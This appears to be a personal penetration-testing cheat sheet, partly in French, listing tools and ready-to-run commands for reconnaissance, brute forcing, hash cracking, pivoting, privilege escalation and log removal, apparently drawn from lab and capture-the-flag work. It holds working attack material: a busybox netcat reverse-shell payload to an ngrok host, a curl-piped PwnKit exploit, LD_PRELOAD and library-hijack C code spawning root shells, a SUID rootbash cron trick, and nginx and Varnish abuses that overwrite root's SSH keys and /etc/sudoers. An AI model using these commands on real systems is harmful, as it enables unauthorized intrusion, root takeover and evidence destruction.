## Docs

- https://persistence-info.github.io/
- https://www.first.org/cvss/calculator/3.0
- https://hacktricks.boitatech.com.br/pentesting/pentesting-web/
- http://michalszalkowski.com/security/pivoting-tunneling-port-forwarding/chisel-socks5-tunneling-windows-rev/

### Cheatsheets

- https://ruuand.github.io/
- https://book.jorianwoltjer.com/
- https://exploit-notes.hdks.org/
- https://github.com/seal9055/oscp-notes
- https://github.com/GrrrDog/weird_proxies
- https://github.com/imran-parray/Mind-Maps
- https://github.com/KathanP19/HowToHunt
- https://github.com/6vr/Bug-Bounty-Tips
- https://github.com/p0dalirius/Awesome-RCE-techniques

## Challenges

- https://hackthebox.com/
- https://pentesterlab.com/
- https://tryhackme.com/path/outline/pentesting
- https://www.root-me.org/en/Challenges/Realist/

## Tools (most shipped with Exegol)

- [Browser & Burp Extensions](https://github.com/4nuit/Hacking/tree/master/web#extensions)
- https://github.com/0xfalafel/rcat
- https://github.com/epinna/weevely3
- https://github.com/0xPugal/One-Liners
- https://github.com/laluka/bypass-url-parser
- https://docs.exegol.com/images/tools#free-image


```bash
# For some OpenVPN configs
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
```

```bash
export TARGET=<IP>
autorecon $TARGET
```

### API

- https://github.com/streaak/keyhacks
- https://github.com/smodnix/31-days-of-API-Security-Tips

### Scanners

- https://github.com/RustScan/RustScan
- https://github.com/vulnersCom/nmap-vulners
- https://github.com/EnableSecurity/wafw00f
- https://github.com/Digitemis/GLPIScan
- https://github.com/projectdiscovery/nuclei
- https://github.com/projectdiscovery/nuclei-templates
- https://github.com/projectdiscovery/subfinder
- https://github.com/projectdiscovery/httpx

#### CMS

- https://github.com/dionach/CMSmap
- https://github.com/ajinabraham/CMSScan
- https://github.com/Tuhinshubhra/CMSeeK
- https://github.com/wpscanteam/wpscan
- https://github.com/redsecurityfr/WPint

#### Hidden Parameters

- https://github.com/s0md3v/Arjun
- https://github.com/s0md3v/XSStrike

### Version Control

- https://github.com/kost/dvcs-ripper
- https://www.sjoerdlangkemper.nl/2017/04/12/download-mercurial-hg-directory/

### Static Analysis

- [Audit code: Pentesting Applications (Whitebox)](https://github.com/4nuit/Hacking/tree/master/audit_code#pentesting-applications-whitebox)
- https://brakemanscanner.org/              # Ruby
- https://github.com/PyCQA/bandit           # Python
- https://github.com/phpstan/phpstan        # Php
- https://github.com/koalaman/shellcheck    # Bash
- https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet

```bash
#https://github.com/trailofbits/semgrep-rules
semgrep --config ~/semgrep-rules/generic/ --severity ERROR --severity WARNING --sarif --sarif-output=pentest_g.sarif .
semgrep --config ~/semgrep-rules/yaml/docker-compose/ --severity ERROR --severity WARNING --sarif --sarif-output=pentest_yaml.sarif .
semgrep --config ~/semgrep-rules/javascript --severity ERROR --severity WARNING --sarif --sarif-output=pentest_js.sarif .
```

### Static binaries

- https://github.com/hugsy/gdb-static
- https://github.com/andrew-d/static-binaries
- https://github.com/moparisthebest/static-curl
- https://github.com/ropnop/impacket_static_binaries

### Pivoting

- https://github.com/jpillora/chisel
- https://github.com/nicocha30/ligolo-ng    # Socks5 alternative
- https://github.com/calebstewart/pwncat    # Best listener 

#### Transfering files

**netcat**

```bash
ncat -l --keep-open [<host>] [<port>] < file
```

**pwncat**

```bash
[Dec 28, 2025 - 21:22:26 (CET)] exegol-test /workspace # pwncat-cs -lp 4444
[21:22:28] Welcome to pwncat üêà!                                                 __main__.py:164
[21:22:29] received connection from 127.0.0.1:46820                                   bind.py:84
[21:22:30] 0.0.0.0:4444: upgrading from /usr/bin/dash to /usr/bin/bash            manager.py:957
[21:22:31] localhost:46820: registered new host w/ db                             manager.py:957
(local) pwncat$ upload curl-amd64 /tmp/curl-amd64
draining buffers... ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ 100.0% ‚Ä¢ 6.5/6.5 MB ‚Ä¢ 1.4 MB/s ‚Ä¢ 0:00:00
(local) pwncat$                                                                                 
# CTRL + D
(remote) www-data@d6f20cba02d9:/var/www/html$ cd /tmp
(remote) www-data@d6f20cba02d9:/tmp$ chmod +x curl-amd64 
(remote) www-data@d6f20cba02d9:/tmp$ ./curl-amd64 -h
```

### Wordlists & Creds

- https://github.com/danielmiessler/SecLists
- https://github.com/ihebski/DefaultCreds-cheat-sheet


## Enumeration

### Arp

```bash
arp -a
sudo arp-scan -I wlan1 -l

arpspoof ‚Äìi wlan1 ‚Äìt <STATION_MAC> <MAC>
```

### TCP/IP

```bash
# Fast and aggressive scan of port 22 on 2**16 machines
nmap -p22 --open -n -T5 --min-rate 10000 10.0.0.1/16

# Scan all ports on 1 machine, using scripts and version detection
nmap -Pn -sC -sV -p- 10.10.11.243
```

| Scan Type | Example Command |
| --- | --- |
| ARP Scan | `sudo nmap -PR -sn MACHINE_IP/24` |
| ICMP Echo Scan | `sudo nmap -PE -sn MACHINE_IP/24` |
| ICMP Timestamp Scan | `sudo nmap -PP -sn MACHINE_IP/24` |
| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24` |
| TCP SYN Ping Scan | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30` |
| TCP ACK Ping Scan | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30` |
| UDP Ping Scan | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30` |

N'oubliez pas d'ajouter l'option `-sn` si vous ne souhaitez effectuer que la d√©couverte d'h√¥tes sans balayage de ports. Omettre `-sn` permettra √† Nmap de scanner les ports des h√¥tes actifs par d√©faut.

Option | Purpose
--- | ---
`-n` | ne pas effectuer de recherche DNS
`-R` | recherche DNS invers√©e pour tous les h√¥tes
`-sn` | d√©couverte d'h√¥tes uniquement


#### Enum4linux

**SMB, starter for Active Directory**:

`enum4linux -a <ip>`


### HTTP, DNS

#### Subfinder

- https://docs.projectdiscovery.io/opensource/httpx/running

```bash
subfinder -d hackerone.com -silent | httpx
```

#### Ffuf

- http://ffuf.me/
- http://ffuf.me/sub/vhost
- http://ffuf.me/cd/pipes # useful for IDOR

```bash
find SecLists -type f -name "common.txt"	#web
find SecLists -type f -name "subdomains*"	#dns

ffuf -w ~/wordlists/common.txt -u http://{ip}/FUZZ -recursion -mc 200
ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.{domain}" -u http://{ip} -mc 200
#mc = matchcode , fc = filter code 
#ffuf -u http://FUZZ.IP/ -w ~/wordlists/subdomains.txt -c -fc 302
```

```bash
dig axfr @10.10.11.212 snoopy.htb
# x.snoopy.htb y.snoopy.htp etc
```

#### Gobuster

**Directory listing**

```bash
gobuster dir -u http://10.10.178.131 / -w directory-list-2.3-medium.txt
gobuster vhost -u http://10.10.178.131 / -w directory-list-2.3-medium.txt --append-domain
```

### Hydra

**Bruteforce Auth**

SSH:

```bash
hydra -l <username> -P rockyou.txt 10.10.80.245 ssh -I -V <-t 4>
```

`Avec wordlist user`

```bash
hydra -L user.txt -P rockyou.txt 10.10.80.245 ssh -t 10 #/etc/passwd
```

FTP:

```bash
hydra -l <username> -P rockyou.txt ftp://10.10.80.245
```

WEB:

```bash
hydra -l <username> -P <wordlist> 10.10.80.245 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

## Crack example_hashes

### Hashcat

- https://hashcat.net/wiki/doku.php?id=example_hashes

#### Dictionnary attack

```bash
hashcat [-a 0] -m XXXX hash rockyou.txt
```

#### Mask Attack

```bash
## Mask for digits: abc-[12345]-def
hashcat -a 3 -m XXXX hash 'abc-?d?d?d?d?d?-def'
```

### John

```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

```bash
#passphrase
ssh2john id_rsa > id_rsa_hash
john --wordlist=rockyou.txt id_rsa_hash
```

```bash
zip2john file.zip > file_hash
john --wordlist=rockyou.txt file_hash
```

## Encoding payloads

- https://www.urlencoder.org/
- https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/

```bash
busybox+nc+4.tcp.eu.ngrok.io+12524+-e+sh+
```


## Port Forwarding

- http://michalszalkowski.com/security/pivoting-tunneling-port-forwarding/chisel-socks5-tunneling-windows-rev/
- http://web.archive.org/web/20220612232400/https://www.orangecyberdefense.com/fr/insights/blog/ethical-hacking/etat-de-lart-du-pivoting-reseau-en-2019


### Public TCP forwarding

```bash
ssh -R 9000:localhost:9000 serveo.net
nc -nlvp 9000
```

### Pivoting / Remote Port Forwarding + Tunneling

```bash
cd /tmp
wget https://github.com/jpillora/chisel/releases/download/v1.7.4/chisel_1.7.4_linux_amd64.gz -O /tmp/chisel.gz
gzip -d chisel.gz
chmod +x chisel
```

#### Attacker / HOST (chisel, do the same on remote/ victim)

```bash
# On PRIVATE network
./chisel server -p 8080 --reverse

# On PUBLIC network (General way)
./chisel server --host localhost -p <PORT_LISTENER_NCAT> --reverse -v
```

#### Victim

```bash
# On PRIVATE network + FULL Tunneling (SOCKS)
./chisel client 192.168.45.218:8080 R:socks

# On PUBLIC network + PARTIAL port Tunneling
./chisel client X.tcp.eu.ngrok.io:YYYYY R:<PORT_TOMAP>:127.0.0.1:<PORT_TOMAP>
```


```bash
# CHECK Tunneling
nmap -p <PORT_TOMAP> 127.0.0.1
```

#### Host : Proxychains4 with SOCKS5

- https://github.com/Andrei-Masilevich/proxychains4
- `proxychains -f config.conf`

```bash
sudo nano /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

#### Host - Proxychains-ng

```bash
yay -S proxychains-ng
nano proxychains.conf

#ecrire
#proxy_dns
#tcp_read_time_out 200
#tcp_connect_time_out 200
#[ProxyList]
#socks5 127.0.0.1 1080

proxychains -q nmap -p21 -Pn 192.168.66.63 -sV
```

```bash
#vm2 sur enp0s8 192.168.66.124/24
#vm1 sur enp0s9 192.168.56.102/24
proxychains -q nmap -p22 -Pn 192.168.66.00/24 -vv
proxychains -q nmap -p- -Pn 192.168.66.63 -vv

#PORT   STATE SERVICE VERSION
#21/tcp open  ftp     vsftpd 2.3.4

proxychains -q nmap -p21 -Pn 192.168.66.63 -sV
proxychains ftp 192.168.66.63
proxychains exploit.py
```


## Post exploitation

### Kernel LPE

```bash
uname -a #rechercher par exploit kernel
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### Metasploit payload ex

- https://www.exploit-db.com/


```bash
msf6 > use exploit/linux/http/metabase_setup_token_rc
[*] Using configured payload cmd/unix/reverse_bash

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce

[*] Using exploit/linux/http/metabase_setup_token_rce
msf6 exploit(linux/http/metabase_setup_token_rce) > set rhosts data.analytical.htb
rhosts => data.analytical.htb
msf6 exploit(linux/http/metabase_setup_token_rce) > set rport 80
rport => 80
msf6 exploit(linux/http/metabase_setup_token_rce) > set lhost tun0
lhost => tun0
msf6 exploit(linux/http/metabase_setup_token_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.214:4444 
```

### Searchsploit

```bash
searchsploit request-baskets #PATH: python/webapps/51675.sh
searchsploit -x 51675 #examine le code source de l'exploit
searchsploit -m 51675 #copie l'exploit dans le PATH courant 
```

### Metasploit

```bash
msfconsole
msf6 > search  metabase

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/metabase_setup_token_rce  2023-07-22       excellent  Yes    Metabase Setup Token RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce
```

### Databases

- https://nmap.org/search/?q=sql+enum

```bash
nmap -sV --script=mysql-enum 10.0.0.4
```

#### Mysql

```bash
mysql -u root
show databases;
use information_schema;
show tables;
select * from columns;
```

**Dump**

```bash
mysqldump --all-databases --all-routines -u root -p > ~/fulldump.sql
```

#### Pgsql

```bash
psql -U postgres -h 127.0.0.1 -p 5432
\l
\c cozyhosting;
\dt
select * from users;
```

## Privesc

- [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [WinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn)

### Processes, Cron jobs

- https://github.com/DominicBreuker/pspy

```bash
# processus en cours
ps aux
```

### Docker

- https://github.com/cdk-team/CDK/
- https://github.com/stealthcopter/deepce
- https://github.com/docker/docker-bench-security
- https://github.com/PercussiveElbow/docker-escape-tool/

### SSH keys 

- https://www.howtouselinux.com/post/ssh-stricthostkeychecking-option

```bash
ssh-keygen
cat ~/.ssh/id_ed25519.pub > authorized_keys
ssh -i ~/.ssh/id_ed25519 user@127.0.0.1
```

### ENV & SUID Programs

- https://www.zerodayinitiative.com/blog/2023/4/5/bash-privileged-mode-vulnerabilities-in-parallels-desktop-and-cdpath-handling-in-macos

```c
//gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
sudo LD_PRELOAD=/tmp/preload.so <program suid>
```

### Shared object Hijacking

```bash
ldd ./vuln_program
```


```c
//gcc -o /tmp/<une lib du programme> -shared -fPIC library_path.c

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
sudo LD_LIBRARY_PATH=/tmp <program>
```

### Cronjobs

```bash
#overwrite.sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Attendre:

```bash
chmod +x /home/user/overwrite.sh
/tmp/rootbash -p
```

### Nginx exploitation

Dans le cas d'un binaire SUID, on rajoute `dav_methods PUT` pour uploader n'importe quel fichier

```bash
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
    worker_connections 768;
    # multi_accept on;
}

http {
    server {
        listen 1337;
        location/ {
            root /;
            autoindex on;
            dav_methods PUT;
    }
}
```

Lancement:

```bash
sudo nginx -c nginx.conf
```

```bash
activemq@broker:/tmp$ netstat -tunlp | grep 1337
netstat -tunlp | grep 1337
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -
```

#### SSH - Keygen

```bash
## attaquant
ssh-keygen -t rsa -b 4096 -f keyname
#victime
curl localhost:1337/root/.ssh/authorized_keys --upload-file keyname.pub

#attaquant
ssh root@10.10.11.243 -i keyname
```

### Varnish

```bash
## nc -nlvp 4444 (term1)

LFILE=/etc/sudoers
sudo varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{pwnd}i' -w "$LFILE"

## nc -nlvp 4444 (term2)
curl -H 'xxx:www-data ALL=(ALL) NOPASSWD:ALL' http://127.0.0.1:6081/xxx
```


## Anti-Forensic (suppression de logs)

- https://github.com/sundowndev/covermyass
